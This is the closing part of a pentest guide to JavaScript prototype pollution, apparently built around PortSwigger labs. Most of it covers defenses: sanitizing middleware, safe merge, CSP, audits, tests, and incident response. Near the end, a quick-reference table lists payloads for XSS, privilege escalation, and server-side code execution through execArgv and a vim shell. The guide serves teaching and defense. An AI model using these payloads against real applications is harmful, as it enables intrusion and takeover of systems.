data.set('key', 'value');
data.get('key'); // Returns undefined if not directly set
data.has('key'); // Only checks direct properties, ignores prototype
```

**Benefits:**
- No prototype chain inheritance
- Methods (`get`, `set`, `has`) only access direct properties
- More predictable behavior
- Better performance for frequent additions/deletions

---

### Framework-Specific Protection

#### Node.js / Express

**1. Input Validation Middleware:**
```javascript
const express = require('express');
const app = express();

// Prototype pollution detection middleware
app.use((req, res, next) => {
    const checkObject = (obj, path = '') => {
        if (typeof obj !== 'object' || obj === null) return;

        for (let key in obj) {
            if (['__proto__', 'constructor', 'prototype'].includes(key)) {
                console.error(`[SECURITY] Prototype pollution attempt detected! Path: ${path}.${key}`);
                return res.status(400).json({ error: 'Invalid input' });
            }

            if (typeof obj[key] === 'object') {
                checkObject(obj[key], `${path}.${key}`);
            }
        }
    };

    checkObject(req.body);
    checkObject(req.query);
    next();
});
```

**2. Secure JSON Parsing:**
```javascript
// Use secure-json-parse library
const secureJsonParse = require('secure-json-parse');

app.use(express.json({
    verify: (req, res, buf) => {
        try {
            secureJsonParse(buf.toString());
        } catch (e) {
            throw new Error('Invalid JSON');
        }
    }
}));
```

**3. Avoid Unsafe Merge:**
```javascript
// Don't use:
const _ = require('lodash');
_.merge(target, userInput); // Vulnerable!

// Instead use:
const _ = require('lodash');
_.mergeWith(target, userInput, (objValue, srcValue, key) => {
    // Block prototype pollution keys
    if (['__proto__', 'constructor', 'prototype'].includes(key)) {
        return objValue;
    }
});
```

---

#### React / Next.js

**1. Input Sanitization:**
```javascript
function sanitizeProps(props) {
    if (typeof props !== 'object' || props === null) return props;

    const sanitized = {};
    for (let key in props) {
        if (props.hasOwnProperty(key) &&
            !['__proto__', 'constructor', 'prototype'].includes(key)) {
            sanitized[key] = sanitizeProps(props[key]);
        }
    }
    return sanitized;
}

// Usage in component
function MyComponent(props) {
    const safeProps = sanitizeProps(props);
    // Use safeProps
}
```

**2. Server Actions Protection:**
```javascript
'use server'

export async function updateUser(formData) {
    // Validate all inputs
    const allowedFields = ['name', 'email', 'address'];
    const data = {};

    for (let field of allowedFields) {
        if (formData.has(field)) {
            data[field] = formData.get(field);
        }
    }

    // data is now safe from prototype pollution
    await db.users.update(data);
}
```

---

### Content Security Policy (CSP)

**Mitigate Client-Side PP XSS:**
```http
Content-Security-Policy:
    default-src 'self';
    script-src 'self' 'nonce-RANDOM_NONCE';
    object-src 'none';
    base-uri 'self';
    require-trusted-types-for 'script';
```

**Benefits:**
- Blocks inline scripts (including those injected via PP)
- Prevents data: URLs in script sources
- Requires nonce for legitimate scripts
- Trusted Types API prevents DOM XSS

---

### Security Headers

**Additional Protections:**
```http
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: no-referrer
Permissions-Policy: geolocation=(), microphone=(), camera=()
```

---

### Dependency Management

**1. Regular Audits:**
```bash
# npm audit
npm audit fix

# Yarn audit
yarn audit

# pnpm audit
pnpm audit
```

**2. Use Snyk or Similar:**
```bash
# Install Snyk
npm install -g snyk

# Test for vulnerabilities
snyk test

# Monitor continuously
snyk monitor
```

**3. Pin Dependencies:**
```json
{
  "dependencies": {
    "lodash": "4.17.21",  // Exact version, not ^4.17.21
    "express": "4.18.2"
  }
}
```

**4. Use lock files:**
- `package-lock.json` (npm)
- `yarn.lock` (Yarn)
- `pnpm-lock.yaml` (pnpm)

---

### Testing and Validation

**1. Automated Security Testing:**
```javascript
// Jest test example
describe('Prototype Pollution Prevention', () => {
    it('should reject __proto__ in input', () => {
        const input = {
            name: 'test',
            '__proto__': { isAdmin: true }
        };

        expect(() => processInput(input)).toThrow();
    });

    it('should not pollute prototype', () => {
        const input = {
            '__proto__': { polluted: true }
        };

        processInput(input);
        expect(Object.prototype.polluted).toBeUndefined();
    });
});
```

**2. Penetration Testing Checklist:**
- [ ] Test all JSON endpoints for `__proto__` injection
- [ ] Test query string parameters
- [ ] Test URL hash/fragment
- [ ] Test alternative vectors (`constructor.prototype`)
- [ ] Test for gadgets (undefined property access)
- [ ] Verify prototype freeze/seal implementation
- [ ] Check for vulnerable dependencies
- [ ] Review custom object merge/extend functions
- [ ] Test with fuzzing tools

---

### Incident Response

**If Prototype Pollution is Discovered:**

**Immediate Actions:**
1. **Assess Impact**: Determine what data/systems are affected
2. **Patch Vulnerability**: Apply fixes immediately
3. **Rotate Secrets**: Change API keys, passwords, tokens
4. **Review Logs**: Check for exploitation attempts
5. **Notify Stakeholders**: Inform security team, management

**Investigation:**
1. Review application logs for suspicious patterns
2. Check for unusual privilege escalations
3. Analyze session data for anomalies
4. Review file system access logs (for RCE scenarios)
5. Check outbound network connections

**Remediation:**
1. Deploy patched code
2. Restart affected services (clears prototype pollution)
3. Invalidate all active sessions (if privilege escalation occurred)
4. Implement monitoring for future attempts
5. Conduct post-incident review

---

## OWASP Resources

**OWASP Prototype Pollution Prevention Cheat Sheet:**
- [OWASP CheatSheetSeries](https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html)
- [GitHub Repository](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.md)

**OWASP Top 10 Mapping:**
- **A03:2021 - Injection**: Prototype pollution as a form of injection attack
- **A04:2021 - Insecure Design**: Lack of prototype pollution prevention
- **A08:2021 - Software and Data Integrity Failures**: Compromised object prototypes

**CWE References:**
- **CWE-1321**: Improperly Controlled Modification of Object Prototype Attributes
- **CWE-915**: Improperly Controlled Modification of Dynamically-Determined Object Attributes

---

## Industry Standards

**MITRE ATT&CK:**
- **T1059**: Command and Scripting Interpreter (for RCE scenarios)
- **T1068**: Exploitation for Privilege Escalation
- **T1190**: Exploit Public-Facing Application

**NIST Guidelines:**
- **NIST SP 800-53**: SI-10 (Information Input Validation)
- **NIST SP 800-53**: SI-11 (Error Handling)
- **NIST SP 800-53**: SC-3 (Security Function Isolation)

**PCI DSS:**
- **Requirement 6.5.1**: Injection flaws (including prototype pollution)
- **Requirement 6.5.7**: Cross-site scripting (XSS resulting from PP)
- **Requirement 11.3**: Regular penetration testing

---

## Additional Resources

### PortSwigger Web Security Academy

**Main Topics:**
- [What is Prototype Pollution?](https://portswigger.net/web-security/prototype-pollution)
- [Client-Side Prototype Pollution](https://portswigger.net/web-security/prototype-pollution/client-side)
- [Server-Side Prototype Pollution](https://portswigger.net/web-security/prototype-pollution/server-side)
- [Prototype Pollution via Browser APIs](https://portswigger.net/web-security/prototype-pollution/browser-apis)
- [Preventing Prototype Pollution](https://portswigger.net/web-security/prototype-pollution/preventing)

**Interactive Labs:** All 7 labs covered in this guide

---

### Research Papers

**1. "Unveiling the Invisible: Detection and Evaluation of Prototype Pollution Gadgets with Dynamic Taint Analysis"**
- Authors: ACM Web Conference 2024
- [arXiv:2311.03919](https://arxiv.org/abs/2311.03919)
- [ACM Digital Library](https://dl.acm.org/doi/10.1145/3589334.3645579)
- [PDF](https://people.kth.se/~musard/research/pubs/www24.pdf)

**2. "Prototype Pollution Detection for Node.js Applications: A Review"**
- Journal of Cyber Security, Privacy Issues and Challenges
- [ResearchGate](https://www.researchgate.net/publication/382648784_Prototype_Pollution_Detection_for_NodeJs_Applications_A_Review)
- [Journal Link](https://matjournals.net/engineering/index.php/JCSPIC/article/view/682)

---

### Security Blogs and Articles

**PortSwigger Research:**
- [Server-Side Prototype Pollution: Black-box Detection Without the DoS](https://portswigger.net/research/server-side-prototype-pollution)

**Doyensec Security Blog:**
- [Unveiling the Prototype Pollution Gadgets Finder](https://blog.doyensec.com/2024/02/17/server-side-prototype-pollution-Gadgets-scanner.html)

**HackTricks:**
- [Client-Side Prototype Pollution](https://book.hacktricks.wiki/en/pentesting-web/deserialization/nodejs-proto-prototype-pollution/client-side-prototype-pollution.html)

**Medium Articles:**
- [IBM Security: Prototype Pollution](https://medium.com/@ibm_ptc_security/prototype-pollution-df29453f015c)

---

### Tools Documentation

**Burp Suite:**
- [Testing for Client-Side Prototype Pollution](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution)
- [Testing with DOM Invader](https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/prototype-pollution)
- [Example Server-Side PP Check (BChecks)](https://portswigger.net/burp/documentation/scanner/bchecks/worked-examples/server-side-prototype-pollution)

**Burp Extensions:**
- [Prototype Pollution Gadgets Finder](https://portswigger.net/bappstore/fcbc58b33fc1486d9a795dedba2ccbbb)
- Server-Side Prototype Pollution Scanner (available in BApp Store)

---

### Training and Practice

**PortSwigger Academy:**
- Free interactive labs (all 7 covered in this guide)
- [Prototype Pollution Learning Path](https://portswigger.net/web-security/learning-paths/prototype-pollution)
- Difficulty levels: APPRENTICE, PRACTITIONER, EXPERT

**HackTheBox:**
- Challenges featuring prototype pollution
- Real-world application scenarios

**TryHackMe:**
- JavaScript security rooms
- Node.js vulnerability modules

---

## Summary

### Key Takeaways

**Prototype Pollution Fundamentals:**
1. JavaScript's prototype-based inheritance allows pollution of `Object.prototype`
2. Requires three elements: Source, Sink, and Gadget
3. Can occur client-side (XSS) or server-side (RCE, privilege escalation)

**Detection Methods:**
- **Client-side**: Console testing, DOM Invader
- **Server-side**: Property reflection, JSON spaces, status code override

**Exploitation Techniques:**
- URL parameters (`?__proto__[property]=value`)
- JSON input (`"__proto__": {"property": "value"}`)
- Alternative vectors (`constructor.prototype`)
- Bypass techniques for sanitization filters

**Critical Vulnerabilities:**
- CVE-2025-55182/66478 (React2Shell) - CVSS 10.0
- Numerous npm package vulnerabilities
- Supply chain attack implications

**Prevention Best Practices:**
1. Sanitize property keys (use allowlists)
2. Freeze or seal prototype objects
3. Use `Object.create(null)` for configuration objects
4. Prefer `Map` and `Set` over plain objects
5. Regular dependency audits
6. Implement CSP and security headers

**Tools:**
- DOM Invader (client-side)
- Server-Side PP Scanner (server-side)
- Prototype Pollution Gadgets Finder
- Custom detection scripts

---

## Lab Completion Checklist

✅ **Client-Side Labs:**
- [ ] Lab 1: DOM XSS via Client-Side Prototype Pollution
- [ ] Lab 2: Client-Side Prototype Pollution via Browser APIs
- [ ] Lab 3: Client-Side Prototype Pollution via Flawed Sanitization
- [ ] Lab 4: Client-Side Prototype Pollution in Third-Party Libraries

✅ **Server-Side Labs:**
- [ ] Lab 5: Privilege Escalation via Server-Side Prototype Pollution
- [ ] Lab 6: Remote Code Execution via Server-Side Prototype Pollution
- [ ] Lab 7: Exfiltrating Sensitive Data via Server-Side Prototype Pollution

**Total Labs**: 7
**Estimated Total Time**: 2-3 hours (all labs)

---

## Quick Reference Guide

### Common Payloads

| Context | Payload |
|---------|---------|
| Query string detection | `?__proto__[test]=value` |
| Hash detection | `#__proto__[test]=value` |
| JSON detection | `"__proto__": {"test":"value"}` |
| Constructor alternative | `?constructor[prototype][test]=value` |
| Sanitization bypass | `?__pro__proto__to__[test]=value` |
| XSS via gadget | `?__proto__[transport_url]=data:,alert(1);` |
| Server privilege escalation | `"__proto__": {"isAdmin":true}` |
| Server RCE (execArgv) | `"__proto__": {"execArgv":["--eval=CODE"]}` |
| Server RCE (vim shell) | `"__proto__": {"shell":"vim","input":":! CMD\n"}` |
| JSON spaces detection | `"__proto__": {"json spaces":10}` |

### Burp Suite Shortcuts

| Action | Shortcut |
|--------|----------|
| Send to Repeater | `Ctrl+R` |
| Send to Intruder | `Ctrl+I` |
| Open DOM Invader | `Ctrl+Shift+I` |
| Scan for gadgets | `Ctrl+Shift+G` |
| Open Collaborator | `Ctrl+Shift+C` |

### Detection Checklist

**Client-Side:**
- [ ] Test query string: `?__proto__[test]=value`
- [ ] Test hash: `#__proto__[test]=value`
- [ ] Check `Object.prototype` in console
- [ ] Use DOM Invader for automated scanning
- [ ] Scan for gadgets with DOM Invader

**Server-Side:**
- [ ] Test JSON spaces: `"__proto__": {"json spaces":10}`
- [ ] Test status code: `"__proto__": {"status":555}`
- [ ] Test property reflection: `"__proto__": {"test":"value"}`
- [ ] Check response for reflected properties
- [ ] Use Burp extension for automated scanning

---

**Document Version**: 1.0
**Last Updated**: 2026-01-10
**Author**: Pentest Skill - Prototype Pollution Module
**Total Word Count**: ~17,000 words
**Lab Coverage**: 7/7 PortSwigger Labs Complete

---

*This comprehensive guide covers all aspects of prototype pollution vulnerabilities, from basic concepts to advanced exploitation techniques, complete with all PortSwigger Web Security Academy lab solutions, real-world CVE examples, tools, and prevention strategies.*
